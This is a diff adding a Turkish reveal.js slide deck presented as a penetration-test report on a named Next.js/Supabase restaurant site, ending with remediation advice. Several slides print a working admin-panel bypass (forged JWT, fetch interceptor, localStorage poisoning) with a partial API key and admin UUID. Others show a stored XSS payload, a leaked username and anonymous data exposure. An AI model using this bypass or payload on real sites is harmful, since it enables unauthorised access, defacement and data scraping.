@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sızma Testi Raporu - oluroluryeriz.com.tr</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.0/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.0/reveal.min.css">
+    
+    <!-- Modern Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.0/plugin/highlight/monokai.min.css">
+
+    <style>
+        /* Figma Inspired Glassmorphism & Gradient Theme */
+        :root {
+            --bg-grad-1: #0B0B0E;
+            --bg-grad-2: #16112C;
+            --bg-grad-3: #1A0B1C;
+            --accent-primary: #FF3366;
+            --accent-secondary: #00E6B8;
+            --text-main: #FFFFFF;
+            --text-muted: #8E8D9D;
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--bg-grad-1), var(--bg-grad-2), var(--bg-grad-3));
+            background-size: 300% 300%;
+            animation: gradientBG 15s ease infinite;
+            font-family: 'Outfit', sans-serif !important;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .reveal .slides {
+            text-align: left;
+        }
+
+        .reveal h1, .reveal h2, .reveal h3 {
+            font-family: 'Outfit', sans-serif;
+            font-weight: 800;
+            text-transform: none;
+            letter-spacing: -0.02em;
+            text-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            background: -webkit-linear-gradient(45deg, var(--text-main), var(--text-muted));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .reveal h1 { font-size: 3.5em; margin-bottom: 20px; }
+        .reveal h2 { 
+            font-size: 2.2em; 
+            margin-bottom: 30px; 
+            color: var(--accent-primary);
+            -webkit-text-fill-color: var(--accent-primary);
+        }
+        
+        .highlight-text {
+            color: var(--accent-secondary) !important;
+            -webkit-text-fill-color: var(--accent-secondary);
+        }
+
+        .reveal p, .reveal li {
+            font-size: 1.1em;
+            color: var(--text-main);
+            line-height: 1.6;
+            font-weight: 300;
+        }
+
+        .glass-card {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        .reveal pre {
+            width: 100%;
+            margin: 20px 0;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .reveal code {
+            font-family: 'JetBrains Mono', monospace;
+            padding: 20px !important;
+            font-size: 0.85em;
+            line-height: 1.4;
+            max-height: 500px;
+            border-radius: 12px;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-size: 0.6em;
+            font-weight: 600;
+            margin-bottom: 20px;
+            border: 1px solid currentColor;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .badge.critical { color: var(--accent-primary); background: rgba(255,51,102,0.1); }
+        .badge.secure { color: var(--accent-secondary); background: rgba(0,230,184,0.1); }
+
+        ul.modern-list {
+            list-style: none;
+            margin-left: 0;
+        }
+        ul.modern-list li {
+            margin-bottom: 15px;
+            padding-left: 30px;
+            position: relative;
+        }
+        ul.modern-list li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: var(--accent-primary);
+            font-weight: bold;
+        }
+
+        /* Abstract shapes */
+        .shape-1, .shape-2 {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: -1;
+            opacity: 0.5;
+        }
+        .shape-1 {
+            width: 400px; height: 400px;
+            background: var(--accent-primary);
+            top: -100px; right: -100px;
+        }
+        .shape-2 {
+            width: 500px; height: 500px;
+            background: var(--accent-secondary);
+            bottom: -200px; left: -100px;
+        }
+
+        /* Yönlendirme ve Scroll Eklemeleri */
+        .reveal .controls {
+            color: var(--accent-primary) !important;
+            opacity: 1 !important;
+            transform: scale(1.3);
+            right: 30px;
+            bottom: 30px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 10px;
+            backdrop-filter: blur(5px);
+        }
+        .reveal .controls button {
+            opacity: 0.8 !important;
+        }
+        .reveal .controls button:hover {
+            opacity: 1 !important;
+            color: var(--accent-secondary) !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+            <section>
+
+            <!-- Title Slide -->
+            <section>
+                <div class="shape-1"></div>
+                <div class="shape-2"></div>
+                <span class="badge critical">GİZLİ SIZMA TESTİ RAPORU</span>
+                <h1>oluroluryeriz<span class="highlight-text">.com.tr</span></h1>
+                <p style="font-size:1.5em; color:var(--text-muted); margin-bottom: 40px;">Mimari Tehditler & Veritabanı Manipülasyon Analizi</p>
+                <div style="display:flex; gap:20px; font-size:0.8em; color:var(--text-muted)">
+                    <div>📅 FAZ 2 SONUÇLARI</div>
+                    <div>🎯 HEDEF: Next.js + Supabase</div>
+                </div>
+            </section>
+
+            <!-- Slide 2 -->
+            <section>
+                <h2>1. Yönetici Özeti</h2>
+                <div class="glass-card">
+                    <p>Sistemin iki yüzü test edilmiştir:</p>
+                    <ul class="modern-list">
+                        <li><strong>Frontend (Client):</strong> İstemci tarafı güvenlik kontrollerinde tam bir çöküş (Bypass) tespit edilmiştir. Next.js mimarisi kandırıldı.</li>
+                        <li><strong>Backend (Supabase):</strong> Çekirdek veriler (Restoranlar vb.) başarıyla korunmuş, ancak ek tablolarda ölümcül güvenlik zafiyetleri görülmüştür.</li>
+                        <li><strong>XSS İstismarı:</strong> Korumasız veritabanı kısımlarından siteye doğrudan zararlı JavaScript enjeksiyonu gerçekleştirilmiştir.</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Credential Leak Slide -->
+            <section>
+                <span class="badge critical">KAYNAK KOD SIZINTISI</span>
+                <h2>2. Kimlik Bilgilerinin İfşası</h2>
+                <div class="glass-card">
+                    <p>Mimarinin temel zayıflıklarından biri <b>Kaynak Kod</b> içerisine gömülen hassas API anahtarlarıdır.</p>
+                    <ul class="modern-list">
+                        <li><b>Supabase Anon Key:</b> Tüm veritabanı kapıları bu yetki anahtarı ile açıldı.</li>
+                        <li><b>Sızıntı Noktası:</b> Next.js derleme dosyalarında (Örn: <code>_next/static/chunks/7df2...js</code>) veritabanı URL'si ve API Anahtarları gizlenmeden açık bırakılmıştır.</li>
+                        <li><b>Etkisi:</b> Arayüzü kullanmadan (Postman, cURL) veritabanına doğrudan bağlantı sağlama yetkisi verir!</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 3 -->
+            <section>
+                <span class="badge critical">AUTH BYPASS</span>
+                <h2>3. Tarayıcıya Güvenmek</h2>
+                <div class="glass-card">
+                    <p>Uygulamanın Admin Paneli, arka uçtan doğrulanmış bir mühür almak yerine <b>Frontend'de JavaScript</b> ile kimlik sormaktadır.</p>
+                    <ul class="modern-list">
+                        <li>Sistemin Beklentisi: LocalStorage'dan Token alınır, <code>fetch</code> ile kontrol edilir.</li>
+                        <li>Siber Saldırımız: Tarayıcıdaki <code>fetch</code> fonksiyonu "Man-in-the-Middle" yöntemiyle hacklendi!</li>
+                        <li>Sonuç: Sunucu reddetse de vizyonel olarak Admin Paneli %100 açıldı.</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 4 -->
+            <section>
+                <h2>4. İstismar Kodu (Bölüm 1)</h2>
+                <p>Sahte bir Mühür (JWT) üretilmesi işlemi:</p>
+                <pre><code class="language-javascript" data-line-numbers="1-10">// OLUROLURYERIZ.COM.TR - ADMIN PANEL BYPASS
+const ADMIN_UUID = "5a6969d5-025a-4942-acc1-1f4093df53b2"; 
+const ANON_KEY = "sb_publishable_ms0iSVMrw4zRoWmYHKJbbg_P...;";
+
+// Bu JWT Supabase'i kandıramaz, ancak arayüzü (UI) kör eder.
+const FAKE_JWT = "eyJhbGciOiJIUzI1NiIsInR5..." + btoa(JSON.stringify({
+    aud: "authenticated", 
+    exp: Math.floor(Date.now() / 1000) + 3600,
+    sub: ADMIN_UUID, role: "authenticated"
+})) + ".FAKE_SIGNATURE";</code></pre>
+            </section>
+
+            <!-- Slide 5 -->
+            <section>
+                <h2>4. İstismar Kodu (Bölüm 2)</h2>
+                <p>Fetch Interceptor ile Ağa (Network) İhanet Edilmesi:</p>
+                <pre><code class="language-javascript" data-line-numbers="1-12">// Arayüz "Bu kişi admin mi?" diye sorduğunda araya giriyoruz:
+const originalFetch = window.fetch;
+window.fetch = async function(...args) {
+    let url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
+
+    if (url.includes('/rest/v1/admins')) {
+        // Gerçek sunucuya soruyu ULAŞTIRMADAN, cevabı biz uyduruyoruz!
+        return new Response(JSON.stringify([{ id: ADMIN_UUID }]), {
+            status: 200, headers: { 'Content-Type': 'application/json' }
+        });
+    }
+    // ...</code></pre>
+            </section>
+
+             <!-- Slide 6 -->
+             <section>
+                <h2>6. İstismar Kodu (Bölüm 3)</h2>
+                <p>Verilerin çekilmesi ve SPA tetiklemesi:</p>
+                <pre><code class="language-javascript" data-line-numbers="1-12">    if (url.includes('supabase.co/rest/v1')) {
+        let headers = new Headers(...);
+        headers.delete('Authorization'); // Yalan JWT'yi gizle
+        headers.set('apikey', ANON_KEY);
+        headers.set('Authorization', `Bearer ${ANON_KEY}`); // Gerçek Public key ile devam
+        return originalFetch.call(this, url, { headers });
+    }
+};
+
+// LocalStorage zehirlenir, sisteme zorla giriş yapılır.
+localStorage.setItem('lezzetkesif-auth', JSON.stringify({ access_token: FAKE_JWT }));
+document.querySelector('a[href="/admin"]').click();</code></pre>
+            </section>
+
+            <!-- Slide 7 -->
+            <section>
+                <span class="badge secure">BAŞARILI SAVUNMA</span>
+                <h2>7. İyi Haber: RLS Duvarı</h2>
+                <div class="glass-card">
+                    <p>Admin paneli kırılsa bile, geliştirici ekibi harika bir arka uç mimarisi (Supabase RLS) tasarlamış!</p>
+                    <ul class="modern-list">
+                        <li><code>restaurants</code>, <code>blog_posts</code>, <code>admins</code> gibi tablolar <b>SADECE</b> backend JWT imzası ile işlem kabul ediyor.</li>
+                        <li>Sisteme yolladığımız tüm zararlı kayıt-silme denemeleri <b>42501 Unauthorized</b> hatasıyla reddedildi.</li>
+                        <li>Bu kural, sistemin göçmesini engelledi.</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 8 -->
+            <section>
+                <span class="badge critical">XSS DEFACEMENT</span>
+                <h2>8. Facia: Unutulan Tablolar</h2>
+                <div class="glass-card">
+                    <p>Ağır zırhlara rağmen, küçük tablolarda RLS kalkanı unutulmuş!</p>
+                    <ul class="modern-list">
+                        <li><b>Açık Tablolar:</b> <code>tags</code> ve <code>restaurant_tags</code></li>
+                        <li><b>İstismar:</b> İçeriye izinsiz olarak <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> kodu başarıyla enjekte edilmiştir.</li>
+                        <li>Sitedeki <b>Farvale</b> adlı restoranın verisine bu virüs etiketi eklenmiş ve veri kalıcı olarak değiştirilmiştir. (Sonradan HACKED BY AUDIT TEST olarak revize edildi)</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 9 -->
+            <section>
+                <span class="badge critical">API SIZINTISI</span>
+                <h2>9. Ölümcül Hata: Önbellek</h2>
+                <div class="glass-card">
+                    <p>Hacklenen bir eylemin Next.js sistemine yansıması normalde zaman alırdı, ancak...</p>
+                    <ul class="modern-list">
+                        <li><b>/api/revalidate</b> endpointi şifresiz ve herkese açık!</li>
+                        <li>Saldırganlar bu API'yi çağırarak sitenin tüm önbelleğini sıfırlayıp, yazdıkları virüslü (XSS) etiketleri anında canlıya geçirdiler.</li>
+                        <li>Bu açık DDoS ve Vercel fatura şişirme saldırılarına yol açar.</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 10: Veri Sızıntıları -->
+            <section>
+                <span class="badge critical">DATA LEAK</span>
+                <h2>10. Sessiz Sızıntılar</h2>
+                <div class="glass-card">
+                    <p>Sistemde admin yetkisi (veya herhangi bir JWT) olmadan <b>anonim şekilde</b> çekilebilen şok edici veriler bulunmuştur:</p>
+                    <ul class="modern-list">
+                        <li><b>Profiller İfşa Olmuş:</b> <code>profiles</code> tablosu herkese açık (RLS kapalı). Tüm üyelerin (örn: <code>60aydoganosman</code>) Kullanıcı Adı, UUID'leri ve kayıt tarihleri çekilebiliyor.</li>
+                        <li><b>Aşırı SSR Veri Dökümü:</b> Next.js Server-Side-Rendering esnasında, 323 restoranın ve tüm blogların arka plan verilerini sayfa HTML kodu içerisine (<code>self.__next_f.push(...)</code> ile) gömüyor. Herkes botlarla saniyeler içinde tüm veritabanını kopyalayabilir.</li>
+                        <li><b>RPC Korumasızlığı:</b> Veritabanınızın iç istatistik fonksiyonları (Örn: <code>/rpc/top_tags</code>) anonim POST çağrılarına tamamen açıktır.</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Slide 11 -->
+            <section>
+                <h2>11. Kesin Çözüm Reçeteleri</h2>
+                <div class="glass-card">
+                    <ul class="modern-list">
+                        <li><b>Server-Side Admin Kontrolü:</b> Client'a güvenmeyin. <code>middleware.ts</code> içerisinde <code>supabase.auth.getSession()</code> kullanın.</li>
+                        <li><b>Güvenlik Kalkanı:</b> Supabase'den <code>tags</code> ve <code>restaurant_tags</code> tabloları için "Enable RLS" kuralını devreye alın.</li>
+                        <li><b>Gizli API:</b> <code>/api/revalidate</code> dosyasına <i>?secret=XXX</i> yetki koşulu ekleyin.</li>
+                        <li><b>Temizlik:</b> 20958935 ID'li XSS test kaydını Supabase'den silin.</li>
+                    </ul>
+                </div>
+            </section>
+
+            </section>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.0/reveal.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.0/plugin/highlight/highlight.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            controls: true,
+            controlsTutorial: true,
+            controlsLayout: 'bottom-right',
+            controlsBackArrows: 'faded',
+            mouseWheel: true,     /* Mouse ile aşağı yukarı kaydırma eklendi */
+            transition: 'slide', // none/fade/slide/convex/concave/zoom
+            backgroundTransition: 'fade',
+            plugins: [ RevealHighlight ],
+            center: true,
+            margin: 0.1
+        });
+    </script>
+</body>
+</html>
